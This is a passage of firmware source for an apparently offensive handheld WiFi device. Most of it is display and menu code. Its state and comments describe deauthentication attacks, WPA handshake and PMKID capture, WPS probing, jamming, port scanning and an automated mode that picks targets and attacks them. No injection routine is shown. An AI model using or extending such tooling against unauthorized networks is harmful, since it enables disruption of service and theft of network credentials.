  drawBrightnessSliderTrack();
  drawSliderKnob(LED_HUE_Y, ledSliderKnobX((int)ledHue, 0, 359));
  drawSliderKnob(LED_BRIGHTNESS_Y, ledSliderKnobX((int)ledBrightness, 0, 255));

  // Preview.
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Preview", LED_PREVIEW_X, LED_PREVIEW_Y - 16);
  uint8_t pr = (uint8_t)(((uint16_t)ledRed * (uint16_t)ledBrightness) / 255);
  uint8_t pg = (uint8_t)(((uint16_t)ledGreen * (uint16_t)ledBrightness) / 255);
  uint8_t pb = (uint8_t)(((uint16_t)ledBlue * (uint16_t)ledBrightness) / 255);
  uint16_t previewColor = tft.color565(pr, pg, pb);
  tft.fillRect(LED_PREVIEW_X, LED_PREVIEW_Y, LED_PREVIEW_W, LED_PREVIEW_H, previewColor);
  tft.drawRect(LED_PREVIEW_X, LED_PREVIEW_Y, LED_PREVIEW_W, LED_PREVIEW_H, TFT_WHITE);

  // Numeric diagnostics.
  tft.fillRect(8, 194, 300, 34, TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  snprintf(val, sizeof(val), "H:%3u  B:%3u", (unsigned)ledHue, (unsigned)ledBrightness);
  tft.drawString(val, 12, 194);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  snprintf(val, sizeof(val), "R:%3u G:%3u B:%3u",
           (unsigned)ledRed, (unsigned)ledGreen, (unsigned)ledBlue);
  tft.drawString(val, 12, 210);
}

// PACKETLAB Monitor screen buttons and state
static Button btnPACKETLABMonBack;
static Button btnPACKETLABMonFiles;
static Button PACKETLABMenuBtns[10];
// PUSH1T screen buttons
static Button btnP1tBack, btnP1tEngage, btnP1tManual, btnP1tPACKETLAB, btnP1tSetTarget;
static uint32_t push1tScreenLastSig = 0;
// SP3CTER screen buttons
static Button btnSpBack, btnSpEngage, btnSpGhost, btnSpSetTarget, btnSpPktLab;
static Button btnPACKETLABSetTargetBack;
static Button btnPACKETLABSetTargetAll;
static Button btnPACKETLABSetTargetRows[8];
static Button btnPACKETLABSetTargetUp;
static Button btnPACKETLABSetTargetDown;
// PACKETLAB attack target selection (compact storage)
static uint8_t PACKETLABTargetBssid[6] = {0};
static char PACKETLABTargetSsid[20] = {0};  // Reduced to save DRAM
static uint8_t PACKETLABTargetChannel = 0;
static bool PACKETLABHasSelectedTarget = false;
static uint32_t PACKETLABMonLastUpdateMs  = 0;
static uint32_t PACKETLABMonLastDrawMs    = 0;  // Separate timer for screen redraws
static int PACKETLABMonLastLineCount      = -1;  // Track content changes
static bool PACKETLABMonLastAttackingState = false;
static bool     PACKETLABCaptureWasClosed = false;
static char     PACKETLABPcapPath[20]        = {0};
static char     PACKETLABSessionLogPath[20]  = {0};
static File     PACKETLABPcapFile;
static File     PACKETLABSessionLogFile;
static uint32_t PACKETLABPcapFrameCount   = 0;

// Deferred PCAP ring buffer — frames are enqueued from the TX callback
// (ISR-like context inside PACKETLABAttackTick) and drained safely every 50ms.
// Minimal queue + fast drain (20fps screen update) = zero drops at 50fps attack rate.
#define PACKETLAB_PCAP_QUEUE_SIZE 1
struct PACKETLABPcapEntry {
  uint8_t  frame[28];    // Captures deauth(26B) + 2B headroom; longer frames truncated
  uint8_t  len;
  uint8_t  channel;
  uint32_t ts_ms;
};
static PACKETLABPcapEntry PACKETLABPcapQueue[PACKETLAB_PCAP_QUEUE_SIZE];
static volatile uint8_t PACKETLABPcapQueueHead = 0;  // write index
static volatile uint8_t PACKETLABPcapQueueTail = 0;  // read  index

#if defined(NEONDRIVE_TARGET_M5TAB5)
static constexpr int MONITOR_MAX_LINES = 64;   // 1280×720, ample DRAM
#elif defined(NEONDRIVE_TARGET_M5CARDPUTER)
static constexpr int MONITOR_MAX_LINES = 4;    // 240×135, no PSRAM — keep tight
#else
static constexpr int MONITOR_MAX_LINES = 6;    // CYD / T-Display
#endif
struct MonitorLine {
  char text[48];  // Reduced to save DRAM
  uint16_t color;
};
static MonitorLine monitorLines[MONITOR_MAX_LINES];
static int monitorLineCount = 0;
static uint32_t monitorLastUpdateMs = 0;
static bool monitorLayoutDrawn = false;
static uint32_t monitorDrawnSig[MONITOR_MAX_LINES] = {0};
static uint16_t monitorDrawnColor[MONITOR_MAX_LINES] = {0};
static int monitorDrawnCount = -1;
static uint32_t monitorLastPkts = 0;
static uint32_t monitorLastBeacon = 0;
static uint32_t monitorLastHs = 0;
// Raw mode monitor tracking (for in-place updates)
static uint32_t rawMonLastPkts = 0;
static uint32_t rawMonLastMgmt = 0;
static uint32_t rawMonLastCtrl = 0;
static uint32_t rawMonLastData = 0;
static uint32_t rawMonLastBeacon = 0;
static uint32_t rawMonLastHs = 0;
static uint32_t rawMonLastDropped = 0;
static uint32_t rawMonLastErrors = 0;
static int rawMonLastPps = 0;
static uint32_t jammitLastTickMs = 0;
static uint32_t jammitLastPkts = 0;
static uint16_t jammitLastScore = 0;
static uint32_t jammitLastDeauthMs = 0;
static uint32_t jammitDeauthCount = 0;
static uint16_t jammitSeqNum = 0;  // IEEE 802.11 sequence counter (12-bit)
// Note: JAMMIT client tracking vars, session log paths, and cached BSSID
// are declared near the top of the file (before handleCapturedPacket).

// Y0INK mode globals
static uint32_t yoinkLastTickMs = 0;
static uint32_t yoinkLastPkts = 0;
static uint16_t yoinkClientCount = 0;
static uint32_t yoinkHandshakeCaptureCount = 0;
static uint32_t yoinkLastDeauthMs = 0;
static uint32_t yoinkDeauthCount = 0;
static uint32_t scopeLastScanMs = 0;
static uint32_t scopeLastDrawMs = 0;
static bool scopeLayoutDrawn = false;
static uint32_t scopeMetaDrawnSig = 0;
static uint32_t scopeApDrawnSig[5] = {0};
static bool scopeScanActive = false;
static uint32_t scopeScanStartedMs = 0;
static constexpr int SCOPE_CH_COUNT = 13;
static constexpr int SCOPE_WATERFALL_MAX_ROWS = 72;
static constexpr int SCOPE_WATERFALL_BINS = 104;
static uint8_t scopeWaterfall[SCOPE_WATERFALL_MAX_ROWS][SCOPE_WATERFALL_BINS];
static uint8_t scopeWaterfallRows = 0;
static uint16_t neonPanicFrame = 0;
static uint32_t neonPanicLastTickMs = 0;
static ScreenId neonPanicReturnScreen = ScreenId::HOME;
enum class NeonPanicMode : uint8_t {
  BOOT_TUNNEL = 0,     // #1
  BLUEPRINT_REALITY,   // #6
  PWN_COUNTER,         // #9
  STEALTH_MINIMAL      // #10
};
static NeonPanicMode neonPanicMode = NeonPanicMode::STEALTH_MINIMAL;
static bool sw1Enabled = false;
static bool sw1WasDown = false;
static uint32_t sw1DebounceUntilMs = 0;

enum class ReconView : uint8_t { DEAUTH = 0, PORT_SCAN };

// Recon globals
static ReconView reconView = ReconView::DEAUTH;
static bool reconActive = false;  // Deauth hunter run state
static bool reconLayoutDrawn = false;
static uint32_t reconLastDrawChannel = 0;
static uint32_t reconLastLogCount = 0;
static uint32_t reconLastTotalEvents = 0;

// Port Scanner screen state
static ReconPortScanner portScanner;
static bool     psActive          = false;
static bool     psLayoutDrawn     = false;
static uint8_t  psLastHostCount   = 0;
static uint8_t  psLastPct         = 0;
static uint8_t  psLastState       = 0;
static bool     psDeepScanEnabled = false;
static uint32_t psLastDrawMs      = 0;
static uint8_t  psScrollOffset    = 0;
static int16_t  psSelectedRow     = -1;
static int16_t  psLastSelectedRow = -1;
static uint16_t psLastRatePerSec  = 0;
static uint32_t psLastPortsAttempted = 0;
static uint8_t  psLastEventCount = 0;
static bool     psNeedsFullStatic = true;
static uint32_t reconConsoleY = 0;
static uint32_t reconConsoleH = 0;
static int16_t reconConsoleX = 8;
static int16_t reconConsoleW = 0;
static uint8_t reconSelectedChannel = 1;
static bool reconChannelLock = false;
static uint32_t reconDeauthConfirmUntilMs = 0;
static uint32_t reconLastUiTickMs = 0;
static String reconStatusLine = "";
static uint8_t reconPortScroll = 0;
static int8_t reconHostSelected = -1;
static UiRect reconHostListRect = {0, 0, 0, 0};
static int reconHostRowH = 14;
static ReconPortScanner reconScanner;


// Monitor view mode
enum class MonitorMode : uint8_t { LIVE, FILES };
static MonitorMode monitorMode = MonitorMode::LIVE;
enum class MonitorTab5Tab : uint8_t { LIVE = 0, SD = 1, LITTLEFS = 2, FILE_VIEW = 3 };
static MonitorTab5Tab monitorTab5Tab = MonitorTab5Tab::LIVE;
static bool monitorTab5Paused = false;
static bool monitorTab5AutoScroll = true;
static uint8_t monitorTab5Filter = 0; // 0=ALL 1=INFO+ 2=WARN+ 3=ERR

// Just Go automation state
enum class JustGoStage : uint8_t { IDLE, SCAN, SELECT_TARGET, RUN_MODE, COOLDOWN };
static bool justGoActive = false;
static bool justGoSprayPray = false;
static bool justGoWpaOnly = true;
static bool justGoAutoHop = true;
static uint8_t justGoStayMinutes = 3;
static JustGoStage justGoStage = JustGoStage::IDLE;
static uint32_t justGoStageStartMs = 0;
static uint32_t justGoTargetStartMs = 0;
static AutoMode justGoMode = AutoMode::NONE;
static uint8_t justGoModeStep = 0;
static uint8_t justGoTargets[3];

// Just Go console update tracking (only update on state changes, not periodic)
static AutoMode justGoLastMode = AutoMode::NONE;
static JustGoStage justGoLastStage = JustGoStage::IDLE;
static uint32_t justGoLastUpdateMs = 0;
static uint8_t justGoLastConsoleLineCount = 0;  // Track console changes for display refresh
static uint8_t justGoTargetCount = 0;
static uint8_t justGoTargetPos = 0;
static char justGoStatusLine[24] = "";
static uint8_t justGoLogCount = 0;

// JustGo console update tracking - trigger immediate updates on metric changes
static AutoMode justGoLastModeReported = AutoMode::NONE;
static uint8_t justGoLastClientCount = 0;
static uint8_t justGoLastHandshakeCount = 0;
static uint8_t justGoLastPmkidCount = 0;
static uint32_t justGoLastDeauthCount = 0;
static uint32_t justGoLastConsoleUpdateMs = 0;
static uint32_t justGoLastRenderSig = 0;
static bool justGoLayoutDrawn = false;

// ── PUSH1T (WPS Intelligence) state ────────────────────────────────────────
static uint32_t push1tLastProbeMs   = 0;
static uint32_t push1tProbeCount    = 0;
static bool     push1tWpsDetected   = false;
static bool     push1tWpsLocked     = false;
static uint8_t  push1tWpsVersion    = 0;
static bool     push1tVulnerable    = false; // WPS 1.0 + unlocked heuristic
static char     push1tManufacturer[24] = "";
static char     push1tDeviceName[24]   = "";
static uint8_t  push1tTargetBssid[6]  = {0};
static bool     push1tBssidCached     = false;

// ── SP3CTER (Ghost PMKID + passive intel) state ────────────────────────────
struct SpecterPmkid {
  uint8_t staMac[6];
  uint8_t apMac[6];
  uint8_t pmkid[16];
};
static constexpr uint8_t SPECTER_PMKID_MAX = 4;
static SpecterPmkid specterPmkids[SPECTER_PMKID_MAX];
static uint8_t   specterPmkidCount   = 0;

struct SpecterHsTrack {
  uint8_t  staMac[6];
  bool     m1, m2, m3, m4;
  uint32_t lastSeenMs;
};
static constexpr uint8_t SPECTER_HS_MAX = 6;
static SpecterHsTrack specterHsTracks[SPECTER_HS_MAX];
static uint8_t   specterHsCount      = 0;

static uint8_t   specterClientMacs[8][6];
static uint8_t   specterClientCount  = 0;

struct SpecterDedup { uint8_t mac[6]; uint64_t replayCtr; };
static constexpr uint8_t SPECTER_DEDUP_MAX = 16;
static SpecterDedup specterDedup[SPECTER_DEDUP_MAX];
static uint8_t   specterDedupHead    = 0;

static uint8_t   specterFakeStaMac[6]  = {0};
static uint32_t  specterLastGhostMs    = 0;
static uint32_t  specterGhostSentMs    = 0;
static uint32_t  specterGhostCount     = 0;
static bool      specterGhostInFlight  = false;
static bool      specterAssocSent      = false;
static uint32_t  specterScreenLastSig  = 0;

// SP3CTER event log ring buffer (displayed on screen)
struct SpecterLogEntry { char text[34]; uint16_t color; };
static constexpr uint8_t SPECTER_LOG_MAX = 8;
static SpecterLogEntry specterEventLog[SPECTER_LOG_MAX];
static uint8_t specterLogHead  = 0;
static uint8_t specterLogCount = 0;

static void specterLogAdd(const char* msg, uint16_t col = 0xFFFF) {
  strncpy(specterEventLog[specterLogHead].text, msg, 33);
  specterEventLog[specterLogHead].text[33] = '\0';
  specterEventLog[specterLogHead].color = col;
  specterLogHead  = (specterLogHead  + 1) % SPECTER_LOG_MAX;
  if (specterLogCount < SPECTER_LOG_MAX) specterLogCount++;
}

// Just Go adaptive feedback state
static bool justGoY0inkExtendedOnce = false;
static bool justGoPostStimulusWindow = false;
static bool justGoTargetHadClient = false;
static bool justGoTargetHadPartial = false;
static bool justGoTargetSucceeded = false;
static uint8_t justGoSessionSuccesses = 0;
static uint8_t justGoSessionAttempts = 0;

// Just Go per-target session stats table
struct JustGoTargetStats {
  char bssid[18];
  uint8_t attempts;
  uint8_t successes;
  uint8_t y0inkTimeouts;
  uint8_t jammitRuns;
  uint8_t clientsMax;
  uint8_t hsMax;
  uint8_t pmkidMax;
  int8_t  bestRssi;
  uint32_t lastTriedMs;
  uint32_t lastSuccessMs;
};
static constexpr uint8_t JUSTGO_STATS_MAX = 8;
static JustGoTargetStats justGoStats[JUSTGO_STATS_MAX];
static uint8_t justGoStatsCount = 0;

#if defined(NEONDRIVE_TARGET_BUTTON_NAV) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
static constexpr uint8_t TDISPLAY_NAV_MAX_ITEMS = 64;
static Button tdisplayNavItems[TDISPLAY_NAV_MAX_ITEMS];
static uint8_t tdisplayNavCount = 0;
static uint8_t tdisplayNavIndex = 0;
static ScreenId tdisplayNavScreen = ScreenId::HOME;
static bool tdisplayNavRefreshRequested = false;

static bool tdisplayNavButtonValid(const Button& b) {
  return (b.w > 2 && b.h > 2);
}

static void tdisplayNavPush(const Button& b) {
  if (!tdisplayNavButtonValid(b)) return;
  if (tdisplayNavCount >= TDISPLAY_NAV_MAX_ITEMS) return;
  tdisplayNavItems[tdisplayNavCount++] = b;
}

static String tdisplayNavCurrentLabel() {
  if (tdisplayNavCount == 0) return "none";
  const char* raw = tdisplayNavItems[tdisplayNavIndex].label;
  if (!raw || raw[0] == '\0') return "item";
  return String(raw);
}

static void tdisplayNavDrawHeaderStatus() {
  if (!currentHeaderTitle || currentHeaderTitle[0] == '\0') return;
  layoutActionDockBox();

  const bool compact = (tft.height() <= 180);
  const int titleX = 8;
  const int titleY = 8;

  tft.setTextDatum(TL_DATUM);
  if (compact) { applyFontSm(); } else { applyFontMd(); }
  String headerTitle = String(currentHeaderTitle);
  const int maxTitleW = uiActionDockSafeLeft() - 8;
  if (maxTitleW > 8) {
    while (headerTitle.length() > 3 && tft.textWidth(headerTitle) > maxTitleW) {
      headerTitle.remove(headerTitle.length() - 1);
    }
    if (headerTitle != String(currentHeaderTitle) && headerTitle.length() > 3) {
      headerTitle.remove(headerTitle.length() - 3);
      headerTitle += "...";
    }
  }

  const int titleW = tft.textWidth(headerTitle);
  const int statusX = titleX + titleW + 6;
  const int statusRight = uiActionDockSafeLeft();
  const int statusW = statusRight - statusX;
  if (statusW < 38) return;

  tft.fillRect(statusX, titleY - 1, statusW, compact ? 10 : 14, TFT_BLACK);
  applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);

  String msg = "SEL: " + tdisplayNavCurrentLabel();
  while (msg.length() > 3 && tft.textWidth(msg) > (statusW - 2)) {
    msg.remove(msg.length() - 1);
  }
  if (msg.length() > 3 && tft.textWidth(msg) > (statusW - 2)) return;

  tft.drawString(msg, statusX + 1, titleY + (compact ? 1 : 2));
}

static void tdisplayNavDrawSelectedOutline() {
  if (tdisplayNavCount == 0) return;

  const Button& b = tdisplayNavItems[tdisplayNavIndex];
  const int yOff = buttonRenderYOffset(b);
  const int bx0 = b.x;
  const int by0 = b.y + yOff;
  const int bx1 = b.x + b.w - 1;
  const int by1 = by0 + b.h - 1;

  const int x0 = clampi(bx0 - 2, 1, tft.width() - 2);
  const int y0 = clampi(by0 - 2, 1, tft.height() - 2);
  const int x1 = clampi(bx1 + 2, 1, tft.width() - 2);
  const int y1 = clampi(by1 + 2, 1, tft.height() - 2);

  const int w = x1 - x0 + 1;
  const int h = y1 - y0 + 1;
  if (w <= 2 || h <= 2) return;

  tft.drawRect(x0, y0, w, h, TFT_YELLOW);
  if (w > 4 && h > 4) {
    tft.drawRect(x0 + 1, y0 + 1, w - 2, h - 2, TFT_CYAN);
  }
}

static void tdisplayNavDrawHint() {
  tdisplayNavBuild();
  tdisplayNavDrawHeaderStatus();
  tdisplayNavDrawSelectedOutline();
}

static void tdisplayNavBuild() {
  if (screen != tdisplayNavScreen) {
    tdisplayNavScreen = screen;
    tdisplayNavIndex = 0;
  }

  tdisplayNavCount = 0;

  switch (screen) {
    case ScreenId::HOME:
      if (homeReconnectPromptActive || homeTargetsPromptActive) {
        tdisplayNavPush(btnHomePromptNo);
        tdisplayNavPush(btnHomePromptYes);
      } else {
        for (int i = 0; i < HOME_BTN_COUNT; i++) tdisplayNavPush(homeBtns[i]);
      }
      break;
    case ScreenId::JUST_GO:
      tdisplayNavPush(btnJustGoBack);
      tdisplayNavPush(btnJustGoToggle);
      tdisplayNavPush(btnJustGoSpray);
      tdisplayNavPush(btnJustGoStayMinus);
      tdisplayNavPush(btnJustGoStayPlus);
      tdisplayNavPush(btnJustGoProfilePrev);
      tdisplayNavPush(btnJustGoProfileNext);
      break;
    case ScreenId::WIFI_SCAN:
      if (wifiConnectShowPasswordModal) {
        for (int i = 0; i < wifiPwKeyCount; i++) tdisplayNavPush(btnWifiPwKeys[i]);
        tdisplayNavPush(btnWifiPwShift);
        tdisplayNavPush(btnWifiPwMode);
        tdisplayNavPush(btnWifiPwBack);
        tdisplayNavPush(btnWifiPwSpace);
        tdisplayNavPush(btnWifiPwClear);
        tdisplayNavPush(btnWifiPwCancel);
        tdisplayNavPush(btnWifiPwConnect);
      } else {
        tdisplayNavPush(btnWifiBack);
        tdisplayNavPush(btnWifiScan);
        tdisplayNavPush(btnWifiConnect);
        tdisplayNavPush(btnWifiTargetGo);
        tdisplayNavPush(btnWifiUp);
        tdisplayNavPush(btnWifiDown);
        for (int i = 0; i < 4; i++) {
          if ((apScroll + i) < apCount) tdisplayNavPush(btnWifiRows[i]);
          if ((apScroll + i) < apCount) tdisplayNavPush(btnWifiChecks[i]);
        }
      }
      break;
    case ScreenId::CONFIRM_TARGET:
      tdisplayNavPush(btnWifiNo);
      tdisplayNavPush(btnWifiYes);
      break;
    case ScreenId::TARGET_DETAILS:
      tdisplayNavPush(btnTargetBack);
      tdisplayNavPush(btnTargetAutomate);
      tdisplayNavPush(btnTargetMonitor);
      tdisplayNavPush(btnTargetLock);
      tdisplayNavPush(btnTargetSniff);
      break;
    case ScreenId::AUTOMATE_MENU:
      tdisplayNavPush(btnAutoBack);
      tdisplayNavPush(btnAutoY0INK);
      tdisplayNavPush(btnAutoRAW);
      tdisplayNavPush(btnAutoSCOPE);
      tdisplayNavPush(btnAutoJAMMIT);
      break;
    case ScreenId::CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnCfgWifi);
      tdisplayNavPush(btnCfgWifiConnect);
      tdisplayNavPush(btnCfgWebserver);
      tdisplayNavPush(btnCfgStartup);
      tdisplayNavPush(btnCfgTelemetry);
      tdisplayNavPush(btnCfgLed);
      break;
    case ScreenId::WIFI_CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnSave);
      tdisplayNavPush(btnHopMinus);
      tdisplayNavPush(btnHopPlus);
      tdisplayNavPush(btnScanMinus);
      tdisplayNavPush(btnScanPlus);
      tdisplayNavPush(btnDeauthToggle);
      tdisplayNavPush(btnWifiDefaultLockToggle);
      break;
    case ScreenId::STARTUP_CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnStartupAutoReconnect);
      tdisplayNavPush(btnStartupDefaultLockToggle);
#if defined(NEONDRIVE_TARGET_M5TAB5)
      tdisplayNavPush(btnStartupAutoRotate);
#endif
      break;
    case ScreenId::TELEMETRY_CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnTelemetryMinus);
      tdisplayNavPush(btnTelemetryPlus);
      tdisplayNavPush(btnTelemetryVerboseToggle);
      break;
    case ScreenId::WIFI_CONNECT:
      if (wifiConnectShowPasswordModal) {
        for (int i = 0; i < wifiPwKeyCount; i++) tdisplayNavPush(btnWifiPwKeys[i]);
        tdisplayNavPush(btnWifiPwShift);
        tdisplayNavPush(btnWifiPwMode);
        tdisplayNavPush(btnWifiPwShowHide);
        tdisplayNavPush(btnWifiPwBack);
        tdisplayNavPush(btnWifiPwSpace);
        tdisplayNavPush(btnWifiPwSaved);
        tdisplayNavPush(btnWifiPwClear);
        tdisplayNavPush(btnWifiPwCancel);
        tdisplayNavPush(btnWifiPwConnect);
        tdisplayNavPush(btnWifiPwReconnect);
        tdisplayNavPush(btnWifiSavedClose);
        for (int i = 0; i < AppConfig::MAX_SAVED_WIFI; i++) tdisplayNavPush(btnWifiSavedRows[i]);
      } else {
        tdisplayNavPush(btnWifiConnectBack);
        tdisplayNavPush(btnWifiConnectScan);
        tdisplayNavPush(btnWifiConnectSubmit);
        tdisplayNavPush(btnWifiConnectDisconnect);
        tdisplayNavPush(btnWifiConnectUp);
        tdisplayNavPush(btnWifiConnectDown);
        for (int i = 0; i < WIFI_CONNECT_VISIBLE_ROWS; i++) tdisplayNavPush(btnWifiConnectList[i]);
      }
      break;
    case ScreenId::WEBSERVER:
      tdisplayNavPush(btnWebserverBack);
      tdisplayNavPush(btnWebserverStartAP);
      tdisplayNavPush(btnWebserverStartServer);
      tdisplayNavPush(btnWebserverWpaSecSync);
      tdisplayNavPush(btnWebserverDownloadResults);
      break;
    case ScreenId::MONITOR:
      tdisplayNavPush(btnMonitorBack);
      tdisplayNavPush(btnMonitorTab1);
      tdisplayNavPush(btnMonitorTab2);
      tdisplayNavPush(btnMonitorUpDir);
      tdisplayNavPush(btnMonitorUp);
      tdisplayNavPush(btnMonitorDown);
      break;
    case ScreenId::PORT_SCANNER:
      tdisplayNavPush(btnPSBack);
      tdisplayNavPush(btnPSStart);
      tdisplayNavPush(btnPSDeep);
      tdisplayNavPush(btnPSScrollUp);
      tdisplayNavPush(btnPSScrollDown);
      tdisplayNavPush(btnPSExport);
      tdisplayNavPush(btnPSClr);
      tdisplayNavPush(btnPSFiles);
      break;
    case ScreenId::RECON_HOME:
      tdisplayNavPush(btnReconHomeBack);
      tdisplayNavPush(btnReconHomeDeauth);
      tdisplayNavPush(btnReconHomeNetScan);
      tdisplayNavPush(btnReconHomeAnalyze);
      break;
    case ScreenId::RECON:
      tdisplayNavPush(btnReconBack);
      tdisplayNavPush(btnReconModeDeauth);
      tdisplayNavPush(btnReconModePort);
      tdisplayNavPush(btnReconStart);
      tdisplayNavPush(btnReconClear);
      tdisplayNavPush(btnReconChMinus);
      tdisplayNavPush(btnReconChPlus);
      tdisplayNavPush(btnReconLock);
      tdisplayNavPush(btnReconPortStartStop);
      tdisplayNavPush(btnReconPortExport);
      tdisplayNavPush(btnReconPortUp);
      tdisplayNavPush(btnReconPortDown);
      break;
    case ScreenId::SCOPE_GRAPH:
      tdisplayNavPush(btnScopeBack);
      tdisplayNavPush(btnScopeRefresh);
      break;
    case ScreenId::ABOUT:
    case ScreenId::TARGETS_PLACEHOLDER:
    case ScreenId::LED_CONTROL:
      tdisplayNavPush(btnBack);
      break;
    case ScreenId::NEON_PANIC:
      break;
    case ScreenId::PUSH1T_SCREEN:
      tdisplayNavPush(btnP1tBack);
      tdisplayNavPush(btnP1tEngage);
      tdisplayNavPush(btnP1tManual);
      tdisplayNavPush(btnP1tSetTarget);
      tdisplayNavPush(btnP1tPACKETLAB);
      break;
    case ScreenId::SP3CTER_SCREEN:
      tdisplayNavPush(btnSpBack);
      tdisplayNavPush(btnSpEngage);
      tdisplayNavPush(btnSpGhost);
      tdisplayNavPush(btnSpSetTarget);
      tdisplayNavPush(btnSpPktLab);
      break;
    case ScreenId::PACKETLAB_MENU:
      for (int i = 0; i < 10; i++) tdisplayNavPush(PACKETLABMenuBtns[i]);
      break;
    case ScreenId::PACKETLAB_MONITOR:
      tdisplayNavPush(btnPACKETLABMonBack);
      tdisplayNavPush(btnPACKETLABMonFiles);
      break;
    case ScreenId::PACKETLAB_SET_TARGET:
      tdisplayNavPush(btnPACKETLABSetTargetAll);
      for (int i = 0; i < 8; i++) tdisplayNavPush(btnPACKETLABSetTargetRows[i]);
      tdisplayNavPush(btnPACKETLABSetTargetUp);
      tdisplayNavPush(btnPACKETLABSetTargetDown);
      tdisplayNavPush(btnPACKETLABSetTargetBack);
      break;
  }

  if (tdisplayNavCount == 0) tdisplayNavPush(btnBack);
  if (tdisplayNavCount > 0 && tdisplayNavIndex >= tdisplayNavCount) tdisplayNavIndex = 0;
}

static bool tdisplayNavConsumeRefreshRequest() {
  const bool pending = tdisplayNavRefreshRequested;
  tdisplayNavRefreshRequested = false;
  return pending;
}

static bool keyboardNavHandleArrowOrEnter(neon_key_t k) {
#if !defined(NEONDRIVE_TARGET_M5CARDPUTER)
  (void)k;
  return false;
#else
  tdisplayNavBuild();
  if (tdisplayNavCount == 0) return false;

  if (k.key == NeonKey::LEFT || k.key == NeonKey::UP) {
    tdisplayNavIndex = (tdisplayNavIndex == 0) ? (tdisplayNavCount - 1) : (tdisplayNavIndex - 1);
    tdisplayNavDrawHint();
    return true;
  }
  if (k.key == NeonKey::RIGHT || k.key == NeonKey::DOWN) {
    tdisplayNavIndex = (uint8_t)((tdisplayNavIndex + 1) % tdisplayNavCount);
    tdisplayNavDrawHint();
    return true;
  }
  if (k.key == NeonKey::ENTER) {
    const Button& b = tdisplayNavItems[tdisplayNavIndex];
    const int yOff = buttonRenderYOffset(b);
    g_synthTouchPending = true;
    g_synthTouchX = b.x + b.w / 2;
    g_synthTouchY = b.y + yOff + b.h / 2;
    return true;
  }
  return false;
#endif
}

static bool tdisplayHandleButtonInput(int& outX, int& outY) {
  static bool wasNextDown   = false;
  static bool wasSelectDown = false;

  tdisplayNavBuild();

  bool nextDown   = false;
  bool selectDown = false;
  bool rotateNext = false;
  bool rotatePrev = false;

#if defined(NEONDRIVE_TARGET_TEMBED)
  // T-Embed: all input comes through the HAL (RotaryEncoder library + debounced buttons).
  // neon_hal_key_get() returns one edge event per call; no raw GPIO reads needed here.
  {
    neon_key_t k = neon_hal_key_get();
    switch (k.key) {
      case NeonKey::DOWN:  rotateNext  = true; break;
      case NeonKey::UP:    rotatePrev  = true; break;
      case NeonKey::ENTER: selectDown  = true; break;
      case NeonKey::BACK: {
        // Side key: activate "Back" or "Cancel" button if one exists;
        // otherwise fall back to cycling to the next nav item.
        bool foundBack = false;
        for (uint8_t i = 0; i < tdisplayNavCount; i++) {
          const char* lbl = tdisplayNavItems[i].label;
          if (lbl && (strcasecmp(lbl, "Back") == 0 || strcasecmp(lbl, "Cancel") == 0)) {
            tdisplayNavIndex = i;
            selectDown = true;
            foundBack = true;
            break;
          }
        }
        if (!foundBack) nextDown = true;
        break;
      }
      default: break;
    }
  }
#else
  // Other BUTTON_NAV targets (T-Display-S3): direct GPIO level reads.
  nextDown   = (PIN_NAV_NEXT   >= 0) && (digitalRead(PIN_NAV_NEXT)   == LOW);
  selectDown = (PIN_NAV_SELECT >= 0) && (digitalRead(PIN_NAV_SELECT) == LOW);
#endif

  if (rotatePrev) {
    if (tdisplayNavCount > 0) {
      tdisplayNavIndex = (tdisplayNavIndex == 0) ? (tdisplayNavCount - 1) : (tdisplayNavIndex - 1);
      tdisplayNavRefreshRequested = true;
    }
    return false;
  }

  if (rotateNext || (nextDown && !wasNextDown)) {
    wasNextDown = true;
    if (tdisplayNavCount > 0) {
      tdisplayNavIndex = (uint8_t)((tdisplayNavIndex + 1) % tdisplayNavCount);
      tdisplayNavRefreshRequested = true;
    }
    return false;
  }

  if (selectDown && !wasSelectDown) {
    wasSelectDown = true;
    if (tdisplayNavCount > 0) {
      const Button& b = tdisplayNavItems[tdisplayNavIndex];
      const int yOff = buttonRenderYOffset(b);
      outX = b.x + (b.w / 2);
      outY = b.y + yOff + (b.h / 2);
      g_lastTouchRawX = outX;
      g_lastTouchRawY = outY;
      g_lastTouchRawZ = 1;
      tdisplayNavDrawHint();
      return true;
    }
    return false;
  }

  if (!nextDown) wasNextDown = false;
  if (!selectDown) wasSelectDown = false;
  return false;
}
#endif

static void layoutHome() {
  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
#if defined(NEONDRIVE_TARGET_M5TAB5)
  // Tab5 is 1280×720 — scale padding, gaps, and button height proportionally.
  const int pad = 24;
  const int gapH = 20;
  const int gapV = 20;
  const int fixedGridBtnH = 140;
#else
  const int pad = 10;
  const int gapH = compact ? 6 : 10;
  const int gapV = compact ? 6 : 12;
#endif
  const int footerTextY = h - 6;
  const int bottomLimit = footerTextY - 14;
  const int topBtnY = compact ? (uiHeaderBandH() + 4) : (uiHeaderBandH() + 12);
  const int totalRowsH = bottomLimit - topBtnY - (gapV * (HOME_BTN_ROWS - 1));
#if defined(NEONDRIVE_TARGET_M5TAB5)
  const int gridBtnH = fixedGridBtnH;
#else
  const int gridBtnH = compact ? max(30, totalRowsH / HOME_BTN_ROWS) : max(56, totalRowsH / HOME_BTN_ROWS);
#endif
  const int row1Y = topBtnY + gridBtnH + gapV;
  const int row2Y = row1Y + gridBtnH + gapV;

  // Reserve right-side room on row 0 for the hypercube module frame.
  layoutActionDockBox();
  const int topRightLimit = ActionDockBoxX - 14;
  const int topWidth = max(180, topRightLimit - pad);
  const int topBtnW = (topWidth - ((HOME_BTN_COLS - 1) * gapH)) / HOME_BTN_COLS;

  const int gridBtnW = (w - (pad * 2) - ((HOME_BTN_COLS - 1) * gapH)) / HOME_BTN_COLS;

  homeBtns[0] = {pad,                        topBtnY, topBtnW, gridBtnH, "Just Go"};
  homeBtns[1] = {pad + topBtnW + gapH,       topBtnY, topBtnW, gridBtnH, "WiFi"};
